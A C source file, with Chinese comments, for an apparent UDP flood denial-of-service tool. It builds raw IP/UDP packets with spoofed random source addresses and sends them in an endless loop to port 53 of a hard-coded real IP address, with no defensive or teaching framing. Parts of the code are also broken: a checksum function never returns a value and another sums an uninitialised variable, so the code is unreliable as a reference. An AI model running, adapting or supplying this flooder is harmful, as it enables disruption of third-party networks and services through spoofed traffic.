/*
https://github.com/wndfly/udpflood  windows版本
https://github.com/pisto/tcpflood/ raw+connect
*/

#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#define __FAVOR_BSD
#define _USE_BSD
#include <netinet/udp.h> // struct udp
#include <string.h>
#include <unistd.h>
#include <errno.h>

#define PACKET_MAX_SIZE 200

//整个IP报文包括3个部分，IP首部，UDP首部，UDP数据部分
struct UDP_PKG {
 struct ip ipH;//IP头部
 struct udphdr udpH;//UDP头部
 unsigned char data[8192];//UDP数据部分

}udp;

// 16 bits ==> 2 octets => unsigned short
unsigned short csum( char *buff , int size )
{
    unsigned long  sum;

    while( size-- != 0 )
        sum += *buff++;

    //Take first 4 bits
    sum  = ( sum >> 16 ) + ( sum & 0xffff );
    sum += ( sum >> 16 );

    //Return one's complement
    return ( unsigned short )( ~sum );
}


//计算校验和
static unsigned short DoS_cksum(unsigned short *data,int length){
  register int left=length;
  register unsigned short*word=data;
  register int sum=0;
  unsigned short ret=0;
  //计算偶数字节
 while(left>1){
    sum+=*word++;
   left-=2;
}
}

void setupIpHeader( struct ip *ipH )
{
	//http://blog.sina.com.cn/s/blog_75e9551f01013w9z.html
	//http://blog.csdn.net/chenjin_zhong/article/details/7271979
	ipH->ip_v = 4; /* version */
	ipH->ip_hl = 5; /* header length */
	ipH->ip_tos = 0; /* type of service */
	ipH->ip_len = sizeof(struct ip) + sizeof(struct udphdr) + PACKET_MAX_SIZE; /* total length */
	ipH->ip_ttl = 255; /* time to live */
	ipH->ip_off = 0; /* fragment offset field */
	ipH->ip_id = sizeof( 45 );  /* identification */
	ipH->ip_p = IPPROTO_UDP; /* protocol */
	ipH->ip_sum = 0; /* checksum */
	ipH->ip_src.s_addr = inet_addr("1.1.1.1"); /* source address */
	ipH->ip_dst.s_addr = inet_addr("1.1.1.1"); /* dest address */

}

void setupUdpHeader( struct udphdr *udpH )
{
	//http://www.cnblogs.com/uvsjoh/archive/2012/12/31/2840883.html
	udpH->uh_sport = htons(1337); //16位源端口
	udpH->uh_dport = htons(53); //16位目的端口
	udpH->uh_ulen = htons(sizeof(struct udphdr ) + PACKET_MAX_SIZE); //16位UDP包长度
	udpH->uh_sum = 0; //16位校验和
}

int random_int(int min, int max)
{
	srandom( time(0)+clock()+random() ); 
	unsigned int s_seed = 214013 * rand() + 2531011;
	return min+(s_seed ^ s_seed>>15)%(max-min+1);
}

unsigned long random_lip(void)
{
	char convi[16];
	sprintf (convi, "%d.%d.%d.%d", random_int(1, 254), random_int(1, 254), random_int(1, 254), random_int(1, 254));
	return inet_addr (convi);
}

char *
random_cip (void)
{
  struct in_addr hax0r;
  hax0r.s_addr = random_lip();
  return (inet_ntoa (hax0r));
}

static inline long myrandom(int begin,int end){//根据不同的种子，随机出不同的数
 int gap=end-begin+1;
 int ret=0;
 //系统时间初始化
 srand((unsigned)time(0));
 ret=random()%gap+begin;//介于begin与end之间的值
 return ret;
}
/*
int main(void)
{
    int s;

    struct sockaddr_in sin;

    //char buff[PACKET_MAX_SIZE];
    char ipSource[15];
    char ipDest[15];

    struct ip *ipH;
    struct udphdr *udpH;
    
    char *dgm, *data;

    printf("[?]IP source: ");
    scanf("%s" , ipSource );

    printf("[?]IP destination: ");
    scanf("%s" , ipDest );

    s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    if( s < 0 )
    {
        printf("[-]Error to open socket.\n");

        return 1;
    }

	int pksize = sizeof(struct ip) + sizeof(struct udphdr) + PACKET_MAX_SIZE;
	
	dgm = (char *) malloc(pksize);
	
    sin.sin_family = AF_INET;
    sin.sin_port = htons(53); //攻击端口
    sin.sin_addr.s_addr = inet_addr( ipDest );

    //memset( buff , 0 , PACKET_MAX_SIZE );

    ipH = (struct ip *) dgm;
    udpH = (struct udphdr *)( dgm + sizeof( struct ip ) );

	data = (char *) (dgm + sizeof(struct ip) + sizeof(struct udphdr));

	memset(dgm, 0, pksize);
	memcpy((char *) data, "G", PACKET_MAX_SIZE);

    setupIpHeader( ipH );
    setupUdpHeader( udpH );

    //udpH->uh_dport = htons( port );

    ipH->ip_src.s_addr = inet_addr( ipSource );
    ipH->ip_dst.s_addr = inet_addr( ipDest );   //same as sin.sin_addr.s_addr

    //udp->uh_sum = csum( buff , ipH->tot_len >> 1 );
    
    udp.ipH = ipH;
    udp.udpH = udpH;
    
    udp.ipH->ip_sum = DoS_cksum((unsigned short*)&udp.ipH,sizeof(udp.ipH));//检验和
    udp.udpH->uh_sum = DoS_cksum((unsigned short*)&udp.udpH,pksize);//UDP校验和

    const int optVal = 1;

    if( setsockopt( s , IPPROTO_IP , IP_HDRINCL , &optVal , sizeof( optVal ) ) < 0 )
    {
        printf("[-]Error to setsockopt to the socket.\n");

        return 1;
    }

    while( 1 )
    {
        if( sendto( s , &udp , ipH->ip_len , 0 , ( struct sockaddr *) &sin , sizeof(struct sockaddr)) == -1 )
        {
        	printf("ipH->ip_len=%d,", ipH->ip_len);
            printf("[-]Error to sendto : %s[%d].\n" , strerror(errno), errno );
            return 1;
        }
        sleep(3);
    }

    printf("\n");
    
    free(dgm);
    close(s);
    return 0;
}
*/
int main(void)
{
	int s;
	int pksize = sizeof(struct ip) + sizeof(struct udphdr) + PACKET_MAX_SIZE;
	struct in_addr src;//源地址
	struct in_addr dst;//目的地址
	
	struct sockaddr_in sin;
	char *d = "117.27.250.200";
	//char *d = "127.0.0.1";
	
	udp.ipH.ip_v = 4; /* version */
	udp.ipH.ip_hl = 5; /* header length */
	udp.ipH.ip_tos = 0; /* type of service */
	udp.ipH.ip_len = pksize; /* total length */
	udp.ipH.ip_ttl = 255; /* time to live */
	udp.ipH.ip_off = 0; /* fragment offset field */
	udp.ipH.ip_id = sizeof( 45 );  /* identification */
	udp.ipH.ip_p = IPPROTO_UDP; /* protocol */
	udp.ipH.ip_sum = 0; /* checksum */
	src.s_addr = (unsigned long)myrandom(0,65535); /* source address */
	udp.ipH.ip_src = src;
	dst.s_addr = inet_addr(d); /* dest address */
	udp.ipH.ip_dst = dst;
	udp.ipH.ip_sum = DoS_cksum((unsigned short*)&udp.ipH,sizeof(udp.ipH));//检验和
	
	udp.udpH.uh_sport = htons(1337); //16位源端口
	udp.udpH.uh_dport = htons(53); //16位目的端口
	udp.udpH.uh_ulen = htons(sizeof(struct udphdr ) + PACKET_MAX_SIZE); //16位UDP包长度
	udp.udpH.uh_sum = 0; //16位校验和
	udp.udpH.uh_sum = DoS_cksum((unsigned short*)&udp.udpH, pksize);//UDP校验和
	
    sin.sin_family = AF_INET;
    sin.sin_port = htons(53); //攻击端口
    sin.sin_addr.s_addr = inet_addr( d );	
	
    s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);

    if( s < 0 )
    {
        printf("[-]Error to open socket.\n");

        return 1;
    }	
    
    const int optVal = 1;
    
    if( setsockopt( s , IPPROTO_IP , IP_HDRINCL , &optVal , sizeof( optVal ) ) < 0 )
    {
        printf("[-]Error to setsockopt to the socket.\n");

        return 1;
    }

    while( 1 )
    {
		src.s_addr = (unsigned long)myrandom(0,65535); /* source address */
		udp.ipH.ip_src = src;    
		udp.ipH.ip_sum = DoS_cksum((unsigned short*)&udp.ipH,sizeof(udp.ipH));//检验和
        if( sendto( s , &udp , pksize  , 0 , ( struct sockaddr *) &sin , sizeof(sin)) < 0 )
        {
            printf("[-]Error to sendto : %s[%d].\n" , strerror(errno), errno );
            return 1;
        }
        sleep(3);
    }

    printf("\n");
    
    close(s);    
}

